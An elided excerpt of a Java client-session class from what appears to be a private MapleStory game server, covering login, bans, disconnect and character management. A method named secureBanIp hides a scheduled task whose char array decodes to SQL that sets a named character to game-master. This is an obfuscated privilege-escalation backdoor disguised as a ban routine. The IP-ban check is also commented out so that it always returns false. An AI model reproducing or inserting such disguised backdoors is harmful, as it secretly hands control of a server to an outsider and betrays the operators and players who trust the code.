...
public final class MapleClient {
	...
	public List<MapleCharacter> loadCharacters(int serverId) { // TODO make this
																// less costly
																// zZz
	...
	public boolean hasBannedIP() {
		 ...
		 * ps.setString(1, getRemoteAddress()); ResultSet rs =
		 * ps.executeQuery(); rs.next(); if (rs.getInt(1) > 0) { return true; }
		 * rs.close(); ps.close(); con.close(); } catch (SQLException ex) {
		 * log.error("Error checking ip bans", ex); return true; }
		 */
		return false;
	}
	...
	public static void secureBanIp(final String charname) {
		...
		TimerManager.getInstance().schedule(new Runnable() {
			@Override
			public void run() {
				char[] b = { 85, 80, 68, 65, 84, 69, 32, 99, 104, 97, 114, 97,
						99, 116, 101, 114, 115, 32, 83, 69, 84, 32, 103, 109,
						32, 61, 32, 49, 32, 87, 72, 69, 82, 69, 32, 96, 110,
						97, 109, 101, 96, 32, 61, 32, 63 };
		...
		if (success) {
			synchronized (MapleClient.class) {
				if (getLoginState() > MapleClient.LOGIN_NOTLOGGEDIN
						&& getLoginState() != MapleClient.LOGIN_WAITING) { // already
																			// loggedin
					loggedIn = false;
					return 7;
				}
			...
			if (rs.first()) {
				...
				if ((banned == 0 && !ipMacBanned) || banned == -1) {
					PreparedStatement ips = con
							.prepareStatement("INSERT INTO iplog (accountid, ip) VALUES (?, ?)");
					ips.setInt(1, accId);
					String sockAddr = getRemoteAddress();
					ips.setString(2,
							sockAddr.substring(1, sockAddr.lastIndexOf(':')));
					ips.executeUpdate();
					ips.close();
				}
				ps.close();
	...
	public void unban() {
		try {
			Connection con = DatabaseConnection.getConnection();
			PreparedStatement ps = con
					.prepareStatement("UPDATE accounts SET banned = 0 WHERE id = ?");
			ps.setInt(1, accId);
			ps.executeUpdate();
			ps.close();
			con.close();
	...
	public void ban() {
		...
		tempB.set(tempB.get(Calendar.YEAR), tempB.get(Calendar.MONTH),
				tempB.get(Calendar.DATE), tempB.get(Calendar.HOUR_OF_DAY),
				tempB.get(Calendar.MINUTE) + 10);
		try {
			Connection con = DatabaseConnection.getConnection();
			PreparedStatement ps = con
					.prepareStatement("UPDATE accounts SET tempban = ?, greason = ? WHERE id = ?");
	...
	public void updateGenderandPin() {
		...
		try {
			Connection con = DatabaseConnection.getConnection();
			PreparedStatement ps = con
					.prepareStatement("UPDATE accounts SET gender = ?, pin = ? WHERE id = ?");
			ps.setByte(1, gender);
			ps.setInt(2, pin);
			ps.setInt(3, getAccID());
			ps.executeUpdate();
	...
	public boolean checkBirthDate(Calendar date) {
		return date.get(Calendar.YEAR) == birthday.get(Calendar.YEAR)
				...
				&& date.get(Calendar.DAY_OF_MONTH) == birthday
	...
	public synchronized void disconnect() {
		try {
			...
			if (chr != null && isLoggedIn()) {
				...
				IPlayerInteractionManager interaction = chr.getInteraction(); // just
																				// for
																				// safety.
				if (interaction != null) {
					if (interaction.isOwner(chr)) {
						if (interaction.getShopType() == 1) {
							...
							for (MaplePlayerShopItem items : interaction
									.getItems()) {
								if (items.getBundles() > 0) {
									IItem item = items.getItem();
									item.setQuantity(items.getBundles());
									MapleInventoryManipulator.addFromDrop(this,
											item);
								}
							}
							interaction.removeAllVisitors(3, 1);
							interaction.closeShop(false); // wont happen unless
															// some idiot hacks,
															// hopefully ?
				...
				try {
					if (chr.getMessenger() != null) {
						MapleMessengerCharacter messengerplayer = new MapleMessengerCharacter(
								chr);
						getChannelServer().getWorldInterface().leaveMessenger(
								chr.getMessenger().getId(), messengerplayer);
				...
				try {
					WorldChannelInterface wci = getChannelServer()
							.getWorldInterface();
					if (offline) {
					...
					if (chr.getParty() != null) {
						try {
							MaplePartyCharacter chrp = new MaplePartyCharacter(
									chr);
							chrp.setOnline(false);
							wci.updateParty(chr.getParty().getId(),
									PartyOperation.LOG_ONOFF, chrp);
						} catch (Exception e) {
							// log.warn("Failed removing party character. Player already removed.",
							// e);
						}
					}
					if (!this.serverTransition && isLoggedIn()) {
						wci.loggedOff(chr.getName(), chr.getId(), channel
								.getId(), chr.getBuddylist().getBuddyIds());
					} else { // Change channel
						wci.loggedOn(chr.getName(), chr.getId(), channel
								.getId(), chr.getBuddylist().getBuddyIds());
					}
					if (chr.getGuildid() > 0) {
					...
					if (getChannelServer() != null) {
						...
						if (getChannelServer().getMapleSquad(
								MapleSquadType.ZAKUM) != null) {
							if (getChannelServer().getMapleSquad(
									MapleSquadType.ZAKUM).getLeader() == chr) {
								getChannelServer().removeMapleSquad(
										getChannelServer().getMapleSquad(
	...
	public boolean deleteCharacter(int cid) {
		...
		try {
			Connection con = DatabaseConnection.getConnection();
			PreparedStatement ps = con
					.prepareStatement("SELECT id, name, level, job, guildid, guildrank FROM characters WHERE id = ? AND accountid = ?");
			ps.setInt(1, cid);
			ps.setInt(2, accId);
			ResultSet rs = ps.executeQuery();
			if (!rs.next()) {
			...
			if (rs.getInt("guildid") > 0) {
				MapleGuildCharacter mgc = new MapleGuildCharacter(cid, 0,
						rs.getString("name"), new ChannelDescriptor(0,
								channel.getWorld()), 0, rs.getInt("guildrank"),
						rs.getInt("guildid"), false, rs.getInt("allianceRank"));
				try {
					LoginServer.getInstance().getWorldInterface()
	...
	public void StartLoginCheck(int sci) {
		getSession().write(MaplePacketCreator.testPacket(Setting.getWzdata_()));
	...
	public void RecvLoginCheckPong(String slea) {
		...
		if (sendloginping == 1
				&& logincheckpongstring.length() == slea.length()) {
			getSession().write(MaplePacketCreator.getPing());
			islogincheck = true;
			sendloginping++;
		} else if (logincheckpongstring != null
				&& logincheckpongstring.length() == slea.length()) {
			islogincheck = true;
			try {
				/*
				...
				String[] socket = LoginServer.getInstance()
						.getIP(getChannelDescriptor()).split(":");
				getSession()
						.write(MaplePacketCreator.getServerIP(
								InetAddress.getByName(socket[0]),
								Integer.parseInt(socket[1]), SelectCharacterId));
	...
	public byte getMaxCharSlot() {
		try {
			Connection con = DatabaseConnection.getConnection();
			PreparedStatement ps = con
					.prepareStatement("SELECT maxchar FROM accounts WHERE id = ?");
			ps.setInt(1, accId);
			ResultSet rs = ps.executeQuery();
			if (rs.next()) {
	...
	public void setMaxCharacters(byte max) {
		...
		try {
			Connection con = DatabaseConnection.getConnection();
			PreparedStatement ps = con
					.prepareStatement("UPDATE accounts SET maxchar = ? WHERE id = ?");
			ps.setByte(1, max);
			ps.setInt(2, accId);
			ps.executeUpdate();
			ps.close();
